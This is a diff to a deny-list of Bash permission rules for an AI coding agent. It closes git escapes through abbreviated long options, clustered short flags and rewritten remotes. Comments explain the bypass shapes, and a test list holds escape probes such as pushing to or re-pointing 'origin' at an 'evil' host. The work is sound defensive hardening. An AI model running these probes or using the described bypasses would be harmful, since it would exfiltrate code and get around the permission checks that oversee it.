@@ -175,8 +175,15 @@ elif kind == "coach":
     # Three questions per option: (1) run a caller's command, (2) read/move
     # credentials or config beyond the repo, (3) reach another repository.
     # Prefix denies close the option-first spelling (`git push --exec=x
-    # origin`). Two more shapes a first-token prefix *can* see, closed here
+    # origin`). More shapes a first-token prefix *can* see, closed here
     # (PR #793 security threads, still #775):
+    #   unique-prefix long options — Git accepts abbreviations of unique
+    #     long options (`--ed` for `--edit`, `--gpg-s` for `--gpg-sign`,
+    #     `--reedit` for `--reedit-message`, `--ex` for `--exec`,
+    #     `--receive-p` for `--receive-pack`, `--recurse-subm` for
+    #     `--recurse-submodules`). The floor uses those unique prefixes so
+    #     the abbreviated and full forms share one rule; the full spelling
+    #     alone left every abbreviation ALLOW.
     #   clustered shorts — `-e`/`-c`/`-S` not at the start of the first
     #     option token (`git add -pe file`, `git commit -aS -m x`). A `:*`
     #     rule whose prefix contains `*` fnmatches the whole command, so
@@ -192,33 +199,42 @@ elif kind == "coach":
     #     schemes, `*git@*`, `*..*`, `*.git*`, `*/*`, and `*:* *` (scp-like
     #     `host:path`; the trailing ` *` stops `:*` being parsed as
     #     word-boundary).
+    #   remote retarget — `git remote set-url` / `git remote add` rewrite
+    #     where `git push origin HEAD` goes. `Bash(git remote-*)` only
+    #     matches hyphenated helpers (`git remote-ext`); `Bash(git remote:*)`
+    #     + `Bash(git remote*)` close the space-form verb. Denying the
+    #     rewrite keeps the AC4-open push from publishing to an attacker
+    #     URL under the same remote name.
     # An option after another token (`git push origin --exec=x`,
     # `git commit -m x --gpg-sign`, `git add designs --edit`) is a shape no
     # prefix rule sees — named on the PR; the parent (#763) alternative is
     # a fixed-argument wrapper.
-    #   checkout — finding: --recurse-submodules (Q3, other repos). Nothing
-    #     else of checkout meets the three questions (quiet/force/track/
-    #     detach/orphan/merge/conflict/patch/pathspec-from-file do not exec,
-    #     do not move credentials, do not reach another repo).
-    #   add — finding: --edit/-e (Q1, opens GIT_EDITOR), including clustered
-    #     `-pe`/`-ue`/`-*e *`. Nothing else of add meets the three questions
-    #     (interactive/patch/chmod/pathspec-from-file/renormalize are local
-    #     index ops).
-    #   commit — findings: --edit/-e and --reedit-message/-c (Q1, editor);
-    #     --gpg-sign/-S (Q1, runs gpg; -Skeyid is a stuck combined form);
+    #   checkout — finding: --recurse-submodules (Q3, other repos), denied
+    #     at unique prefix `--recurse-subm`. Nothing else of checkout meets
+    #     the three questions (quiet/force/track/detach/orphan/merge/
+    #     conflict/patch/pathspec-from-file do not exec, do not move
+    #     credentials, do not reach another repo).
+    #   add — finding: --edit/-e (Q1, opens GIT_EDITOR), including unique
+    #     prefix `--ed` and clustered `-pe`/`-ue`/`-*e *`. Nothing else of
+    #     add meets the three questions (interactive/patch/chmod/
+    #     pathspec-from-file/renormalize are local index ops).
+    #   commit — findings: --edit/-e and --reedit-message/-c (Q1, editor;
+    #     unique prefixes `--ed` / `--reedit`); --gpg-sign/-S (Q1, runs gpg;
+    #     unique prefix `--gpg-s`; -Skeyid is a stuck combined form);
     #     clustered `-aS`/`-sS`/`-amS` via `-*S *`, clustered `-ae`/`-ac`
     #     via `-*e *`/`-*c *`. Bare `git commit` (no -m) also launches the
     #     editor: that is not an option a prefix can refuse without
     #     swallowing `git commit -m`, so it is the wrapper case, not a deny.
     #     Other options (message/file/author/date/amend/signoff/trailer/
     #     cleanup/pathspec-from-file) do not meet the three questions.
-    #   push — findings: --receive-pack/--exec (Q1, path to a program);
-    #     --repo (Q3); --recurse-submodules=on-demand|only (Q3, other
-    #     repos); a URL or path as the repository argument (Q3: https/http/
-    #     ssh/git/ftp/file/ext::, scp-like git@, absolute /, ./, ., ~,
-    #     dest-not-first of those, relative `../` / `*.git` / any `/`).
-    #     --set-upstream/--force/--thin/--signed/--push-option/--verify do
-    #     not meet the three questions as options (hooks are the env lock).
+    #   push — findings: --receive-pack/--exec (Q1; unique prefixes
+    #     `--receive-p` / `--ex`); --repo (Q3); --recurse-submodules (Q3;
+    #     unique prefix `--recurse-subm`); a URL or path as the repository
+    #     argument (Q3: https/http/ssh/git/ftp/file/ext::, scp-like git@,
+    #     absolute /, ./, ., ~, dest-not-first of those, relative `../` /
+    #     `*.git` / any `/`). --set-upstream/--force/--thin/--signed/
+    #     --push-option/--verify do not meet the three questions as options
+    #     (hooks are the env lock).
     GIT_FLOOR = [
         {"Bash(git -*)"},
         {"Bash(git -c:*)"}, {"Bash(git -c*)"}, {"Bash(git -C:*)"}, {"Bash(git -C*)"},
@@ -237,30 +253,31 @@ elif kind == "coach":
         {"Bash(git archive:*)"}, {"Bash(git upload-pack:*)"},
         {"Bash(git upload-archive:*)"},
         {"Bash(git credential:*)"}, {"Bash(git credential*)"},
-        {"Bash(git grep:*)"}, {"Bash(git remote-*)"},
+        {"Bash(git grep:*)"},
+        {"Bash(git remote:*)"}, {"Bash(git remote*)"}, {"Bash(git remote-*)"},
         {"Bash(git instaweb:*)"}, {"Bash(git send-email:*)"},
-        {"Bash(git add --edit:*)"}, {"Bash(git add --edit*)"},
+        {"Bash(git add --ed:*)"}, {"Bash(git add --ed*)"},
         {"Bash(git add -e:*)"}, {"Bash(git add -e*)"},
         {"Bash(git add -pe:*)"}, {"Bash(git add -pe*)"},
         {"Bash(git add -ue:*)"}, {"Bash(git add -ue*)"},
         {"Bash(git add -*e *)"},
-        {"Bash(git checkout --recurse-submodules:*)"},
-        {"Bash(git checkout --recurse-submodules*)"},
-        {"Bash(git commit --edit:*)"}, {"Bash(git commit --edit*)"},
+        {"Bash(git checkout --recurse-subm:*)"},
+        {"Bash(git checkout --recurse-subm*)"},
+        {"Bash(git commit --ed:*)"}, {"Bash(git commit --ed*)"},
         {"Bash(git commit -e:*)"}, {"Bash(git commit -e*)"},
         {"Bash(git commit -*e *)"},
-        {"Bash(git commit --reedit-message:*)"},
-        {"Bash(git commit --reedit-message*)"},
+        {"Bash(git commit --reedit:*)"},
+        {"Bash(git commit --reedit*)"},
         {"Bash(git commit -c:*)"}, {"Bash(git commit -c*)"},
         {"Bash(git commit -*c *)"},
-        {"Bash(git commit --gpg-sign:*)"}, {"Bash(git commit --gpg-sign*)"},
+        {"Bash(git commit --gpg-s:*)"}, {"Bash(git commit --gpg-s*)"},
         {"Bash(git commit -S:*)"}, {"Bash(git commit -S*)"},
         {"Bash(git commit -*S *)"},
-        {"Bash(git push --receive-pack:*)"}, {"Bash(git push --receive-pack*)"},
-        {"Bash(git push --exec:*)"}, {"Bash(git push --exec*)"},
+        {"Bash(git push --receive-p:*)"}, {"Bash(git push --receive-p*)"},
+        {"Bash(git push --ex:*)"}, {"Bash(git push --ex*)"},
         {"Bash(git push --repo:*)"}, {"Bash(git push --repo*)"},
-        {"Bash(git push --recurse-submodules:*)"},
-        {"Bash(git push --recurse-submodules*)"},
+        {"Bash(git push --recurse-subm:*)"},
+        {"Bash(git push --recurse-subm*)"},
         {"Bash(git push https:*)"}, {"Bash(git push https*)"},
         {"Bash(git push *https*)"},
         {"Bash(git push http:*)"}, {"Bash(git push http*)"},
@@ -360,17 +377,22 @@ ESCAPE_PROBES = [
     "git credential fill", "git credential-store get",
     "git grep -Ox y", "git remote-ext . x", "git instaweb --httpd=x",
     "git send-email x",
-    "git add --edit file", "git add -e file",
+    "git remote set-url origin https://evil/r.git",
+    "git remote add evil https://evil/r.git",
+    "git add --edit file", "git add --ed file", "git add -e file",
     "git add -pe file", "git add -ue file", "git add -pea file",
-    "git checkout --recurse-submodules",
-    "git commit --edit", "git commit -e", "git commit -ae -m x",
-    "git commit --reedit-message=HEAD", "git commit -c HEAD",
-    "git commit -ac HEAD",
-    "git commit --gpg-sign=x", "git commit -Sx",
+    "git checkout --recurse-submodules", "git checkout --recurse-subm",
+    "git commit --edit", "git commit --ed", "git commit -e",
+    "git commit -ae -m x",
+    "git commit --reedit-message=HEAD", "git commit --reedit=HEAD",
+    "git commit -c HEAD", "git commit -ac HEAD",
+    "git commit --gpg-sign=x", "git commit --gpg-s=x -m x", "git commit -Sx",
     "git commit -aS -m x", "git commit -sS -m x", "git commit -amS -m x",
-    "git push --receive-pack=x origin", "git push --exec=x origin",
+    "git push --receive-pack=x origin", "git push --receive-p=id foo",
+    "git push --exec=x origin", "git push --ex=sh origin",
     "git push --repo=https://x origin",
     "git push --recurse-submodules=on-demand",
+    "git push --recurse-subm=on-demand",
     "git push https://evil/r.git HEAD", "git push http://evil/r.git HEAD",
     "git push ssh://evil/r.git HEAD", "git push git://evil/r.git HEAD",
     "git push git@evil:r.git HEAD", "git push ftp://evil/r.git HEAD",
@@ -597,21 +619,23 @@ EOF
     "Bash(git filter-branch:*)" "Bash(git difftool:*)" "Bash(git mergetool:*)"
     "Bash(git daemon:*)" "Bash(git archive:*)" "Bash(git upload-pack:*)"
     "Bash(git upload-archive:*)" "Bash(git credential:*)" "Bash(git credential*)"
-    "Bash(git grep:*)" "Bash(git remote-*)" "Bash(git instaweb:*)" "Bash(git send-email:*)"
-    "Bash(git add --edit:*)" "Bash(git add --edit*)" "Bash(git add -e:*)" "Bash(git add -e*)"
+    "Bash(git grep:*)"
+    "Bash(git remote:*)" "Bash(git remote*)" "Bash(git remote-*)"
+    "Bash(git instaweb:*)" "Bash(git send-email:*)"
+    "Bash(git add --ed:*)" "Bash(git add --ed*)" "Bash(git add -e:*)" "Bash(git add -e*)"
     "Bash(git add -pe:*)" "Bash(git add -pe*)" "Bash(git add -ue:*)" "Bash(git add -ue*)"
     "Bash(git add -*e *)"
-    "Bash(git checkout --recurse-submodules:*)" "Bash(git checkout --recurse-submodules*)"
-    "Bash(git commit --edit:*)" "Bash(git commit --edit*)" "Bash(git commit -e:*)" "Bash(git commit -e*)"
+    "Bash(git checkout --recurse-subm:*)" "Bash(git checkout --recurse-subm*)"
+    "Bash(git commit --ed:*)" "Bash(git commit --ed*)" "Bash(git commit -e:*)" "Bash(git commit -e*)"
     "Bash(git commit -*e *)"
-    "Bash(git commit --reedit-message:*)" "Bash(git commit --reedit-message*)"
+    "Bash(git commit --reedit:*)" "Bash(git commit --reedit*)"
     "Bash(git commit -c:*)" "Bash(git commit -c*)" "Bash(git commit -*c *)"
-    "Bash(git commit --gpg-sign:*)" "Bash(git commit --gpg-sign*)"
+    "Bash(git commit --gpg-s:*)" "Bash(git commit --gpg-s*)"
     "Bash(git commit -S:*)" "Bash(git commit -S*)" "Bash(git commit -*S *)"
-    "Bash(git push --receive-pack:*)" "Bash(git push --receive-pack*)"
-    "Bash(git push --exec:*)" "Bash(git push --exec*)"
+    "Bash(git push --receive-p:*)" "Bash(git push --receive-p*)"
+    "Bash(git push --ex:*)" "Bash(git push --ex*)"
     "Bash(git push --repo:*)" "Bash(git push --repo*)"
-    "Bash(git push --recurse-submodules:*)" "Bash(git push --recurse-submodules*)"
+    "Bash(git push --recurse-subm:*)" "Bash(git push --recurse-subm*)"
     "Bash(git push https:*)" "Bash(git push https*)" "Bash(git push *https*)"
     "Bash(git push http:*)" "Bash(git push http*)" "Bash(git push *http://*)"
     "Bash(git push ssh:*)" "Bash(git push ssh*)" "Bash(git push *ssh://*)"
